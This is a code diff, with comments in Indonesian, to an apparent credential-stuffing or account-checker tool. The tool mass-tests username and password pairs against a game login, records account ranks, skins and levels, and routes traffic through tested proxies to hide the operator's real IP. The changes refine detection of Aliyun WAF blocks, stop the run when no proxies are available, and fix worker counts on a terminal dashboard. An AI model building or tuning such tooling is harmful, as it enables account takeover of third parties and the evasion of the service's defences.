@@ -271,7 +271,7 @@ stats = {
     'proxy_ctx': 0,
     'rank_mythic': 0, 'rank_legend': 0, 'rank_epic': 0, 'rank_other': 0,
     'peak_skins': 0, 'peak_lvl': 0,
-    'proxy_label': 'None', 'workers': 0, 'status': 'RUNNING',
+    'proxy_label': 'None', 'workers': 0, 'workers_total': 0, 'status': 'RUNNING',
     'bytes_used': 0,
 }
 
@@ -337,7 +337,7 @@ def render_dashboard(force: bool = False):
     out_lines.append(f"{c(RED)}╭{'─'*left_d}{title}{c(RED)}{'─'*right_d}╮{W}")
 
     # Row 1: Elapsed | Workers | Status
-    hdr_left = _pad(f"  {c(WHITE)}elapsed {el_str}{W}     {c(GREEN)}* {stats['workers']}/{stats['workers']} workers{W}", W_IN - _vis_len(badge))
+    hdr_left = _pad(f"  {c(WHITE)}elapsed {el_str}{W}     {c(GREEN)}* {stats['workers']}/{stats.get('workers_total', stats['workers'])} workers{W}", W_IN - _vis_len(badge))
     out_lines.append(_box_line(f"{hdr_left}{badge}", W_OUT))
 
     # Row 2: Compact Proxy + Real-Time Quota bar
@@ -1242,9 +1242,12 @@ async def do_fast_http_post(page, user: str, passw: str, wid: int = 0) -> tuple[
         )
         status = resp.get("status", 0)
         body = (resp.get("text") or "").strip().lstrip("\ufeff").strip()
-        if status == 405 or "aliyun" in body.lower() or "waf" in body.lower():
+        if status == 405:
             return "WAF", {"__waf": True, "message": f"HTTP_{status}"}
         if not body.startswith("{"):
+            low = body.lower()
+            if "aliyun" in low or "waf" in low:
+                return "WAF", {"__waf": True, "message": f"HTTP_{status}"}
             return "ERR", {"message": f"HTTP_{status}: {body[:60]}"}
         res_json = json.loads(body)
         if isinstance(res_json.get("data"), str) and len(res_json["data"]) > 20:
@@ -1290,7 +1293,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0) -
                 # tanpa ini response dengan BOM/leading-space terlewat sepenuhnya
                 body_stripped = body.strip().lstrip('\ufeff').strip()
                 body_low = body_stripped.lower()
-                if 'aliyun' in body_low or 'waf' in body_low or resp.status == 405:
+                if resp.status == 405 or (not body_stripped.startswith('{') and ('aliyun' in body_low or 'waf' in body_low)):
                     api_result["had_waf"] = True
                     resp_event.set()
                 if body_stripped.startswith('{'):
@@ -2140,24 +2143,27 @@ async def async_main():
         live_pool = None
         if PROXY_ENABLED:
             raw_p = load_proxies(PROXY_FILE)
-            if raw_p:
-                p_out(f"{c(CYAN)}[*] Menguji {len(raw_p)} proxy...{W}")
-                # FIX: test_proxies tidak lagi butuh browser (raw HTTP test)
-                good_proxies = await test_proxies(raw_p, concurrency=10)
-                if good_proxies:
-                    p_out(f"{c(GREEN)}[*] {len(good_proxies)} proxy berfungsi ✓{W}")
-                    live_pool = [p[1] for p in good_proxies]
-                    for i in range(NUM_CONTEXTS):
-                        proxy_assignments[i] = good_proxies[i % len(good_proxies)][1]
-                else:
-                    p_out(f"\n  {c(RED)}{BD}[!] Semua proxy gagal diuji.{W}")
-                    p_out(f"  {c(GOLD)}Penyebab: Kuota DataImpulse habis (407 TRAFFIC_EXHAUSTED) atau proxy offline.{W}")
-                    p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
-                    return
+            if not raw_p:
+                p_out(f"\n  {c(RED)}{BD}[!] File proxy kosong atau tidak ditemukan: {PROXY_FILE}{W}")
+                p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
+                return
+            p_out(f"{c(CYAN)}[*] Menguji {len(raw_p)} proxy...{W}")
+            # FIX: test_proxies tidak lagi butuh browser (raw HTTP test)
+            good_proxies = await test_proxies(raw_p, concurrency=10)
+            if good_proxies:
+                p_out(f"{c(GREEN)}[*] {len(good_proxies)} proxy berfungsi ✓{W}")
+                live_pool = [p[1] for p in good_proxies]
+                for i in range(NUM_CONTEXTS):
+                    proxy_assignments[i] = good_proxies[i % len(good_proxies)][1]
+            else:
+                p_out(f"\n  {c(RED)}{BD}[!] Semua proxy gagal diuji.{W}")
+                p_out(f"  {c(GOLD)}Penyebab: Kuota DataImpulse habis (407 TRAFFIC_EXHAUSTED) atau proxy offline.{W}")
+                p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
+                return
 
         stats['total'] = len(queue)
         stats['start'] = time.time()
-        stats['workers'] = min(NUM_CONTEXTS, len(queue))
+        stats['workers_total'] = stats['workers'] = min(NUM_CONTEXTS, len(queue))
         stats['proxy_label'] = f"{os.path.basename(PROXY_FILE)} ({len(live_pool or [])} live)" if PROXY_ENABLED else "None (Direct)"
         _TUI_ACTIVE = True
         sys.stdout.write("\033[?1049h\033[?25l\033[2J\033[H")
@@ -2194,16 +2200,17 @@ async def async_main():
                         fail_count = 0  # reset counter after sustained healthy work
                     fail_count += 1
                     if fail_count > MAX_CONSECUTIVE_FAILS:
+                        stats['workers'] = max(0, stats['workers'] - 1)
                         if not _TUI_ACTIVE:
                             p_out(f"{c(RED)}[!] w{wid} crash {MAX_CONSECUTIVE_FAILS}x berturut-turut, dihentikan: {e}{W}")
-                        _LIVE_LOGS.append(('ERR', f"worker-{wid}", f"stopped:{str(e)[:22]}"))
-                        render_dashboard()
+                        else:
+                            print_result('ERR', f"worker-{wid}", "sys", f"stopped:{str(e)[:15]}")
                         break
                     wait = min(2 ** min(fail_count, 4), 16)  # exponential backoff max 16s
                     if not _TUI_ACTIVE:
                         p_out(f"{c(GOLD)}[!] w{wid} crash #{fail_count}, restart dalam {wait}s...{W}")
-                    _LIVE_LOGS.append(('ERR', f"worker-{wid}", f"restart #{fail_count}"))
-                    render_dashboard()
+                    else:
+                        print_result('ERR', f"worker-{wid}", "sys", f"restart #{fail_count}")
                     await asyncio.sleep(wait)
 
         num_workers = min(NUM_CONTEXTS, len(queue))
